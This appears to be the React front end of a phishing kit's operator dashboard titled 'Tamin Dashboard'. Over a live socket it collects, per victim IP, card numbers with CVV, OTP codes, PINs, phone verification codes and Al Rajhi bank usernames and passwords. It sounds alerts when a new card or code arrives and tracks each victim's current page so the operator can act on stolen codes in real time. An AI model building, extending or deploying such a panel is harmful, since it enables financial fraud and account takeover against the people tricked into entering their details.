// src/App.js
import React, { useEffect, useState, useRef } from "react";
import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
import { socket } from "./socket";
import UserTable from "./components/UserTable";
import CardModal from "./components/CardModal";
import Login from "./Login";
import "bootstrap/dist/css/bootstrap.min.css";

export default function App() {
  const [users, setUsers] = useState({});
  const [cardIp, setCardIp] = useState(null);
  const audioUnlocked = useRef(false);
  const dataSound = useRef(null);
  const cardSound = useRef(null);
  const codeSound = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    dataSound.current = new Audio("/sounds/new-data.wav");
    cardSound.current = new Audio("/sounds/new-card.wav");
    codeSound.current = new Audio("/sounds/new-code.wav");
    [dataSound, cardSound, codeSound].forEach((r) => {
      if (r.current) { r.current.preload = "auto"; r.current.load(); }
    });

    const unlock = () => {
      if (audioUnlocked.current) return;
      [dataSound, cardSound, codeSound].forEach((r) => {
        if (!r.current) return;
        r.current.play().then(() => { r.current.pause(); r.current.currentTime = 0; }).catch(() => {});
      });
      audioUnlocked.current = true;
    };
    ["click", "touchstart", "keydown"].forEach((e) => document.addEventListener(e, unlock, { once: true }));

    const token = localStorage.getItem("token");
    if (!token) { navigate("/login", { replace: true }); return; }

    socket.connect();
    socket.emit("loadData");

    socket.on("initialData", (data) => {
      const map = {};

      const ensure = (ip) => {
        if (!map[ip]) map[ip] = { payments: [], flag: false, hasNewData: false, hasPayment: false, pins: [], otps: [], phones: [], phoneCodes: [], rajhis: [] };
      };

      // Flatten upsert models
      ["index", "vehicle", "insurance", "addon", "summary"].forEach((key) => {
        (data[key] || []).forEach((r) => {
          ensure(r.ip);
          map[r.ip] = { ...map[r.ip], ...r, payments: map[r.ip].payments, flag: map[r.ip].flag, hasNewData: false, hasPayment: map[r.ip].hasPayment, lastActivityAt: Math.max(map[r.ip].lastActivityAt || 0, r.updatedAt ? new Date(r.updatedAt).getTime() : 0) };
        });
      });

      // Payments
      (data.payment || []).forEach((p) => {
        ensure(p.ip);
        map[p.ip].payments.push(p);
        map[p.ip].hasPayment = true;
      });

      // OTPs
      (data.otp || []).forEach((o) => {
        ensure(o.ip);
        if (!map[o.ip].otps) map[o.ip].otps = [];
        map[o.ip].otps.push(o);
        if (o.verificationCode) map[o.ip].latestOtp = o.verificationCode;
      });

      // Pins
      (data.pin || []).forEach((p) => {
        ensure(p.ip);
        if (!map[p.ip].pins) map[p.ip].pins = [];
        map[p.ip].pins.push(p);
        if (p.pin) map[p.ip].latestPin = p.pin;
      });

      // Phones
      (data.phone || []).forEach((p) => {
        ensure(p.ip);
        map[p.ip].latestPhone = p.phoneNumber;
        map[p.ip].latestOperator = p.operator;
      });

      // Phone codes
      (data.phonecode || []).forEach((p) => {
        ensure(p.ip);
        if (!map[p.ip].phoneCodes) map[p.ip].phoneCodes = [];
        map[p.ip].phoneCodes.push(p);
        if (p.phoneCode) map[p.ip].latestPhoneCode = p.phoneCode;
      });

      // Rajhi
      (data.rajhi || []).forEach((r) => {
        ensure(r.ip);
        map[r.ip].rajhiUsername = r.username;
        map[r.ip].rajhiPassword = r.password;
      });

      // Flags
      (data.flags || []).forEach(({ ip, flag }) => { ensure(ip); map[ip].flag = flag; });

      // Locations
      (data.locations || []).forEach(({ ip, currentPage }) => { ensure(ip); map[ip].currentPage = currentPage; });

      setUsers(map);
    });

    const play = (ref) => {
      if (!ref.current) return;
      try { ref.current.currentTime = 0; ref.current.play().catch(() => {}); } catch {}
    };

    const mergeData = (u) => setUsers((m) => {
      play(dataSound);
      const old = m[u.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      return { ...m, [u.ip]: { ...old, ...u, payments: old.payments, flag: old.flag, hasNewData: true, hasPayment: old.hasPayment, lastActivityAt: Date.now() } };
    });

    const mergeCode = (u) => setUsers((m) => {
      play(codeSound);
      const old = m[u.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      return { ...m, [u.ip]: { ...old, ...u, payments: old.payments, flag: old.flag, hasNewData: true, hasPayment: old.hasPayment, lastActivityAt: Date.now() } };
    });

    const appendPayment = (p) => setUsers((m) => {
      play(cardSound);
      const old = m[p.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      const dup = old.payments.some((x) => x.cardNumber === p.cardNumber && x.cvv === p.cvv);
      if (dup) return m;
      return { ...m, [p.ip]: { ...old, ...p, payments: [...old.payments, p], flag: old.flag, hasNewData: true, hasPayment: true, lastActivityAt: Date.now() } };
    });

    const mergeOtp = (o) => setUsers((m) => {
      play(codeSound);
      const old = m[o.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false, otps: [] };
      const otps = [...(old.otps || []), o];
      return { ...m, [o.ip]: { ...old, otps, latestOtp: o.verificationCode, hasNewData: true, lastActivityAt: Date.now() } };
    });

    const mergePin = (p) => setUsers((m) => {
      play(codeSound);
      const old = m[p.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false, pins: [] };
      const pins = [...(old.pins || []), p];
      return { ...m, [p.ip]: { ...old, pins, latestPin: p.pin, hasNewData: true, lastActivityAt: Date.now() } };
    });

    const mergePhone = (p) => setUsers((m) => {
      play(dataSound);
      const old = m[p.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      return { ...m, [p.ip]: { ...old, latestPhone: p.phoneNumber, latestOperator: p.operator, hasNewData: true, lastActivityAt: Date.now() } };
    });

    const mergePhoneCode = (p) => setUsers((m) => {
      play(codeSound);
      const old = m[p.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false, phoneCodes: [] };
      const phoneCodes = [...(old.phoneCodes || []), p];
      return { ...m, [p.ip]: { ...old, phoneCodes, latestPhoneCode: p.phoneCode, hasNewData: true, lastActivityAt: Date.now() } };
    });

    const mergeRajhi = (r) => setUsers((m) => {
      play(dataSound);
      const old = m[r.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      return { ...m, [r.ip]: { ...old, rajhiUsername: r.username, rajhiPassword: r.password, hasNewData: true, lastActivityAt: Date.now() } };
    });

    const mergeSilent = (u) => setUsers((m) => {
      const old = m[u.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      return { ...m, [u.ip]: { ...old, ...u, payments: old.payments, flag: old.flag, hasNewData: old.hasNewData, hasPayment: old.hasPayment } };
    });

    socket.on("newIndex", mergeData);
    socket.on("newVehicle", mergeData);
    socket.on("newInsurance", mergeData);
    socket.on("newAddon", mergeData);
    socket.on("newSummary", mergeData);
    socket.on("newPayment", appendPayment);
    socket.on("newOtp", mergeOtp);
    socket.on("newPin", mergePin);
    socket.on("newPhone", mergePhone);
    socket.on("newPhoneCode", mergePhoneCode);
    socket.on("newRajhi", mergeRajhi);

    socket.on("locationUpdated", ({ ip, page }) => {
      if (page !== "offline") {
        mergeSilent({ ip, currentPage: page });
      } else {
        setUsers((m) => m[ip] ? { ...m, [ip]: { ...m[ip], currentPage: "offline" } } : m);
      }
    });

    socket.on("userDeleted", ({ ip }) => setUsers((m) => { const c = { ...m }; delete c[ip]; return c; }));
    socket.on("flagUpdated", ({ ip, flag }) => setUsers((m) => ({ ...m, [ip]: { ...(m[ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false }), flag } })));

    return () => { socket.off(); };
  }, [navigate]);

  const handleShowCard = (ip) => {
    setCardIp(ip);
    setUsers((m) => m[ip] ? { ...m, [ip]: { ...m[ip], hasNewData: false } } : m);
  };

  return (
    <Routes>
      <Route path="/login" element={<Login />} />
      <Route
        path="/"
        element={
          localStorage.getItem("token") ? (
            <DashboardView users={users} cardIp={cardIp} setCardIp={setCardIp} onShowCard={handleShowCard} />
          ) : (
            <Navigate to="/login" replace />
          )
        }
      />
      <Route path="*" element={<Navigate to={localStorage.getItem("token") ? "/" : "/login"} replace />} />
    </Routes>
  );
}

function DashboardView({ users, cardIp, setCardIp, onShowCard }) {
  const scrollRef = React.useRef(0);
  React.useLayoutEffect(() => { scrollRef.current = window.scrollY; });
  React.useEffect(() => { window.scrollTo(0, scrollRef.current); });

  return (
    <div className="container-fluid py-3">
      <div className="d-flex justify-content-between align-items-center mb-3">
        <h4 className="mb-0">🛡️ Tamin Dashboard</h4>
        <button className="btn btn-sm btn-outline-danger" onClick={() => { localStorage.removeItem("token"); window.location.href = "/login"; }}>
          Logout
        </button>
      </div>
      <UserTable users={users} cardIp={cardIp} onShowCard={onShowCard} />
      {cardIp && (
        <CardModal ip={cardIp} user={users[cardIp]} onClose={() => setCardIp(null)} />
      )}
    </div>
  );
}
